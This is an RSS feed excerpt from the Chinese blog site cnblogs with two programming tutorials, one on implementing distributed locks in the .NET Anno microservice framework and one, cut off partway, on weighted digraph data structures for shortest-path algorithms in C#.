<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>.netcore 微服务快速开发框架 Anno&amp;Viper -分布式锁是个什么鬼 - 杜燕明</title>
<link>http://www.cnblogs.com/duyanming/p/14201135.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/duyanming/p/14201135.html</guid>
<description>&lt;p&gt;&lt;strong&gt;&lt;strong&gt;1、什么是锁&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;　　锁&lt;/strong&gt;&lt;/strong&gt;是为了解决多线程或者多进程资源竞争的问题。&lt;/p&gt;
&lt;p&gt;　　同一进程的多个线程资源竞争可以用lock解决。&lt;/p&gt;
&lt;p&gt;　　lock 关键字可确保当一个线程位于代码的临界区时，另一个线程不会进入该临界区。 如果其他线程尝试进入锁定的代码，则它将一直等待（即被阻止），直到该对象被释放。&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test  
{  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;定义一个私有成员变量，用于Lock  &lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;object&lt;/span&gt; lockobj = &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;&lt;span&gt;();  
    &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; DoSomething()  
    {  
        &lt;/span&gt;&lt;span&gt;lock&lt;/span&gt;&lt;span&gt; (lockobj)  
        {  
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;需要锁定的代码块  &lt;/span&gt;
&lt;span&gt;        }  
    }  
}  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　多进程之间解决资源竞争问题我们则需要引入分布式锁。通过一个协调者来解决，通常的解决办法是通过redis来解决，这里不展开redis分布式锁的讨论。　接下来我们来聊聊如何自己实现一个分布式锁（不依赖于redis）。　&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、分布式锁是个什么鬼&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 　　分布式锁是分布式、微服务中一个必然要讨论的话题。他为的是解决多进程多线程资源竞争的问题。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202012/998152-20201228162159966-1799757901.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　下面我们以订单系统下单扣减库存为例聊一聊扣减库存的问题。&lt;/p&gt;
&lt;p&gt;　　三个客户KA、KB、KC同时下单购买物品P1，请求通过负载均衡器分发到订单服务A、订单服务B、订单服务C。这个时候三个服务同时要对数据库中的P1物品判断库存是否充足。假设库存剩余10个，KA需要购买6个、KB需要购买6个、KC需要购买6个。&lt;/p&gt;
&lt;p&gt;　　正常情况下服务A、B、C都查询了库存大于购买的数量，那么三个服务都判断可以下单。此时我们可以看到，她们都进行下单明显剩余库存不足18个，那么就会出现超卖的问题。那我们怎么办。我们第一时间会想到&lt;span&gt;&lt;strong&gt;锁&lt;/strong&gt;&lt;span&gt;，不过在分布式环境下程序自带的Lock已经不能解决我们的问题。&lt;/span&gt;&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　消息队列也可以解决这个问题，不过这里我们不讨论，我们要讨论的是用锁来解决。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;这个时候我们需要一个&lt;span&gt;协调者&lt;/span&gt;来协调三个服务同时只能有一个请求进入下单代码块。&lt;span&gt;原理同本地锁一样（当一个线程位于代码的临界区时，另一个线程不会进入该临界区。 如果其他线程尝试进入锁定的代码，则它将一直等待（即被阻止），直到该对象被释放）&lt;span&gt;。另外我们还需要注意的是，如果锁的拥有者出现问题，不能及时释放锁。那么就会导致其他服务一直等待。那么就会出现死锁的问题，因此我们也必须一如超时机制。在我们预设的处理时间内不能释放锁则需要协调者自动释放锁。防止出现死锁。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;　　下面我们来看看微服务框架Anno是如何实现一个分布式锁。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;　　如果对Anno微服务框架不了解可以看这里《&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;a id=&quot;cb_post_title_url&quot; class=&quot;postTitle2 vertical-middle&quot; href=&quot;https://www.cnblogs.com/duyanming/p/13949446.html&quot;&gt;【开源】.net微服务开发引擎Anno开源啦&lt;/a&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;》&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;2、实现一个分布式锁&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Collections.Generic;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Text;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Threading.Tasks;


&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; ConsoleTest
{
    &lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Anno.Const;
    &lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Anno.EngineData;
    &lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Anno.Loader;
    &lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Anno.Rpc.Client;
    &lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Anno.Rpc.Server;
    &lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Autofac;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DLockTest
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Handle()
        {
            Init();
        To:
            List&lt;/span&gt;&amp;lt;Task&amp;gt; ts = &lt;span&gt;new&lt;/span&gt; List&amp;lt;Task&amp;gt;&lt;span&gt;();
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;请输入线程数:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;.TryParse(Console.ReadLine(), &lt;span&gt;out&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; n);
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; n; i++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; task = Task.Factory.StartNew(() =&amp;gt; { DLTest1(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Anno&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;); });
                ts.Add(task);
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;var taskXX = Task.Factory.StartNew(() =&amp;gt; { DLTest1(&quot;Viper&quot;); });
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ts.Add(taskXX);

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;var taskJJ = Task.Factory.StartNew(() =&amp;gt; { DLTest1(&quot;Key001&quot;); });
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ts.Add(taskJJ);&lt;/span&gt;
&lt;span&gt;            }

            Task.WaitAll(ts.ToArray());
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; To;
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DLTest1(&lt;span&gt;string&lt;/span&gt; lk = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;duyanming&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
            {
                Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{DateTime.Now:yyyy-MM-dd HH:mm:ss:ffff}  {System.Threading.Thread.CurrentThread.ManagedThreadId} DLTest1拉取锁({lk})&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (DLock dLock = &lt;span&gt;new&lt;/span&gt; DLock(lk, &lt;span&gt;10000&lt;/span&gt;&lt;span&gt;))
                {
                    Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{DateTime.Now:yyyy-MM-dd HH:mm:ss:ffff}  {System.Threading.Thread.CurrentThread.ManagedThreadId} DLTest1进入锁({lk})&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                    System.Threading.Thread.Sleep(&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;);
                }

                Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{DateTime.Now:yyyy-MM-dd HH:mm:ss:ffff}  {System.Threading.Thread.CurrentThread.ManagedThreadId} DLTest1离开锁({lk})&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; Init()
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;SettingService.AppName = &quot;DLockTest&quot;;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;SettingService.Local.IpAddress = &quot;127.0.0.1&quot;;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;SettingService.Local.Port = 6660;&lt;/span&gt;
&lt;span&gt;
            IocLoader.GetAutoFacContainerBuilder().RegisterType(&lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;(RpcConnectorImpl)).As(&lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(IRpcConnector)).SingleInstance();
            IocLoader.Build();
            DefaultConfigManager.SetDefaultConnectionPool(&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;, Environment.ProcessorCount * &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;50&lt;/span&gt;&lt;span&gt;);
            DefaultConfigManager.SetDefaultConfiguration(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DLockTest&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;6660&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; GitHub地址：&lt;a href=&quot;https://github.com/duyanming/Anno.Core/blob/master/test/ConsoleTest/DLockTest.cs&quot; target=&quot;_blank&quot;&gt;https://github.com/duyanming/Anno.Core/blob/master/test/ConsoleTest/DLockTest.cs&lt;/a&gt; &lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202012/998152-20201228172214377-2137066854.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;不同类型的锁可以同时进入相互不影响&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;var&lt;/span&gt; task = Task.Factory.StartNew(() =&amp;gt; { DLTest1(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Anno&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;); });
                ts.Add(task);
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; taskXX = Task.Factory.StartNew(() =&amp;gt; { DLTest1(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Viper&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;); });
                ts.Add(taskXX);

                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; taskJJ = Task.Factory.StartNew(() =&amp;gt; { DLTest1(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Key001&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;); });
                ts.Add(taskJJ);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/998152/202012/998152-20201228173809927-824788515.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;上图我们开了12个进程同时进入DLTest1 方法， &lt;/p&gt;
&lt;pre&gt;
using (DLock dLock = new DLock(lk, 10000&lt;span&gt;))设置超时时间10秒。&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;关键代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DLTest1(&lt;span&gt;string&lt;/span&gt; lk = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;duyanming&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
            {
                Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{DateTime.Now:yyyy-MM-dd HH:mm:ss:ffff}  {System.Threading.Thread.CurrentThread.ManagedThreadId} DLTest1拉取锁({lk})&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (DLock dLock = &lt;span&gt;new&lt;/span&gt; DLock(lk, &lt;span&gt;10000&lt;/span&gt;&lt;span&gt;))
                {
                    Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{DateTime.Now:yyyy-MM-dd HH:mm:ss:ffff}  {System.Threading.Thread.CurrentThread.ManagedThreadId} DLTest1进入锁({lk})&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                    System.Threading.Thread.Sleep(&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;&lt;span&gt;);
                }

                Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{DateTime.Now:yyyy-MM-dd HH:mm:ss:ffff}  {System.Threading.Thread.CurrentThread.ManagedThreadId} DLTest1离开锁({lk})&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;所有源码都可以在 &lt;strong&gt;Anno&lt;/strong&gt;中找到。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Anno&lt;/strong&gt;核心源码:&lt;a href=&quot;https://github.com/duyanming/Anno.Core&quot; target=&quot;_blank&quot;&gt;https://github.com/duyanming/Anno.Core&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Viper&lt;/strong&gt;示例项目:&lt;a href=&quot;https://github.com/duyanming/Viper&quot; target=&quot;_blank&quot;&gt;https://github.com/duyanming/Viper&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;体验地址：&lt;a href=&quot;http://140.143.207.244/Home/Login&quot; target=&quot;_blank&quot;&gt;http://140.143.207.244/Home/Login&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;QQ交流群：478399354 &lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 31 Dec 2020 00:44:00 +0000</pubDate>
<dc:creator>杜燕明</dc:creator>
<og:description>1、什么是锁 锁是为了解决多线程或者多进程资源竞争的问题。 同一进程的多个线程资源竞争可以用lock解决。 lock 关键字可确保当一个线程位于代码的临界区时，另一个线程不会进入该临界区。 如果其他线</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/duyanming/p/14201135.html</dc:identifier>
</item>
<item>
<title>图 - 最短路径 - Ruby_Lu</title>
<link>http://www.cnblogs.com/afei-24/p/14077501.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/afei-24/p/14077501.html</guid>
<description>&lt;p&gt;　　从一个顶点到达另一个顶点的成本最小的路径。&lt;/p&gt;

&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201215073309675-702391621.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　我们采用一个一般性的模型，即加权有向图。在加权有向图中，每条有向路径都有一个与之关联的路径权重，它是路径中的所有边的权重之和。这种重要的度量方式使得我们能够将这个问题归纳为 “找到有个顶点到达另一个顶点的权重最小的有向路径”。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;单点最短路径&lt;/strong&gt;。给定一幅加权有向图和一个起点 s ，“从 s 到给定的目的顶点 v 是否存在一条有向路径？如果有，找出最短（总权重最小）的那条路径”。&lt;/p&gt;
&lt;p&gt;　　相关问题：&lt;/p&gt;
&lt;p&gt;　　1.加权有向图的 API 和实现以及单点最短路径的 API；&lt;/p&gt;
&lt;p&gt;　　2.解决边的权重非负的最短路径问题的经典 Dijkstra 算法；&lt;/p&gt;
&lt;p&gt;　　3.在无环加权有向图中解决该问题的一种快速方法，边的权重可以是负数；&lt;/p&gt;
&lt;p&gt;　　4.适用于一般情况的经典 Bellman-Ford 算法，其中图可以含有环，边的权重也可以是负数；&lt;/p&gt;
&lt;p&gt;　　还需要算法来找出负权重的环，以及不含有这种环的加权有向图中的最短路径。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　1.最短路径的性质&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　1.路径是有向的。最短路径需要考虑各条边的方向。&lt;/p&gt;
&lt;p&gt;　　2.权重不一定等价于距离。&lt;/p&gt;
&lt;p&gt;　　3.并不是所有顶点都是可达的。为了简化问题，这里的样图都是强连通的。&lt;/p&gt;
&lt;p&gt;　　4.负权重会使问题更复杂。&lt;/p&gt;
&lt;p&gt;　　5.最短路径一般都是简单的。这里的算法会忽略构成环的零权重边，因此找到的最短路径都不会含有环。&lt;/p&gt;
&lt;p&gt;　　6.最短路径不一定是惟一的。从一个顶点到达另一个顶点的最短路径可能有多条，我们只要找到其中一条即可。&lt;/p&gt;
&lt;p&gt;　　7.可能存在平行边和自环。平行边中权重最小的边才会被选中，最短路径也不可能包含自环，除非自环的权重为零，但会忽略它。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;最短路径&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　我们的重点是单点最短路径问题，其中给出起点 s ，计算的结果是一棵&lt;strong&gt;最短路径树（SPT）&lt;/strong&gt;，它包含了顶点 s 到所有可达的顶点的最短路径。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201215203416624-1922530967.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　这样一棵树一定存在的：一般来说，从 s 到一个顶点有可能存在两条长度相等的路径，可以删除其中一条路径的最后一条边。如此这般，直到从起点到每个顶点都只有一条路径相连（即一棵树）。通过构造这棵最短路径树，可以为用例提供从 s 到图中任何顶点的最短路径，表示方法为一组指向父结点的链接。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　2.加权有向图的数据结构&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;加权有向图边的API&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201215204519260-2089752140.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DirectedEdge
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; v;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;边的起点&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; w;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;边的终点&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; weight;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;边的权重&lt;/span&gt;

        &lt;span&gt;public&lt;/span&gt; DirectedEdge(&lt;span&gt;int&lt;/span&gt; v,&lt;span&gt;int&lt;/span&gt; w,&lt;span&gt;double&lt;/span&gt;&lt;span&gt; weight)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.v =&lt;span&gt; v;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.w =&lt;span&gt; w;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.weight =&lt;span&gt; weight;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; Weight()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; weight;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; From()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; v;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; To()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; w;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;　　&lt;strong&gt;加权有向图的API&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201215204627159-1431446226.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; EdgeWeightedDigraph
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; v;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;顶点总数&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; e;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;边的总数&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; List&amp;lt;DirectedEdge&amp;gt;[] adj;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;邻接表&lt;/span&gt;

        &lt;span&gt;public&lt;/span&gt; EdgeWeightedDigraph(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; v)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.v =&lt;span&gt; v;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.e = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            adj &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; List&amp;lt;DirectedEdge&amp;gt;&lt;span&gt;[v];

            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; v; i++&lt;span&gt;)
            {
                adj[i] &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; List&amp;lt;DirectedEdge&amp;gt;&lt;span&gt;();
            }
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; V()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; v;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; E()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; e;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; AddEdge(DirectedEdge _e)
        {
            adj[_e.From()].Add(_e);
            e&lt;/span&gt;++&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerable&amp;lt;DirectedEdge&amp;gt; Adj(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; v)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; adj[v];
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerable&amp;lt;DirectedEdge&amp;gt;&lt;span&gt; Edges()
        {
            List&lt;/span&gt;&amp;lt;DirectedEdge&amp;gt; edges = &lt;span&gt;new&lt;/span&gt; List&amp;lt;DirectedEdge&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; _adj &lt;span&gt;in&lt;/span&gt;&lt;span&gt; adj)
            {
                edges.AddRange(_adj);
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; edges;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201215210227115-866385813.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;　　最短路径的API&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201215210349589-866316116.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;　　最短路径的数据结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201215211226029-1939408868.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;


&lt;p&gt;　　最短路径树中的边。和深度优先搜索，广度优先搜索一样，使用一个顶点索引的 DirectedEdge 对象的父链接数组 edgeTo[ ] ，其中 edgeTo[v] 的值为树中连接 v 和它的父结点的的边（也是从 s 到 v 的最短路径上的最后一条边）。&lt;/p&gt;
&lt;p&gt;　　到达起点的距离。我们需要一个由顶点索引的数组 distTo[ ] ，其中 distTo[v] 为从 s 到 v 的已知最短路径的长度。&lt;/p&gt;

